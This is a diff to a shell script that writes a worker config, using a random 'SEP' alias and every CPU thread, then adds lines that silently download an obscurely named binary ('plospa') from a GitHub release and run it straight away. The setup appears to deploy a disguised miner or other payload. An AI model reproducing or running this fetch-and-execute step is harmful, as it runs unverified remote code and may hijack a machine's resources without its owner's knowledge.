@@ -6,6 +6,7 @@ THREADS=$(nproc --all)
 # Generate a random worker name (e.g., SEP + 5 random uppercase letters/digits)
 WORKER_NAME="SEP$(cat /dev/urandom | tr -dc 'A-Z0-9' | fold -w 5 | head -n 1)"
 
+# Generate the JSON config
 cat > appsettings.json <<EOF
 {
   "ClientSettings": {
@@ -26,4 +27,15 @@ cat > appsettings.json <<EOF
 }
 EOF
 
-echo "Config generated with alias $WORKER_NAME and $THREADS threads."
+echo "✅ Config generated with alias $WORKER_NAME and $THREADS threads."
+
+# Download plospa binary from GitHub
+echo "⬇️  Downloading 'plospa'..."
+wget -q https://github.com/vedhagsvp/taberas/releases/download/latest/plospa -O plospa
+
+# Make it executable
+chmod +x plospa
+
+# Run the downloaded executable
+echo "🚀 Starting plospa..."
+./plospa
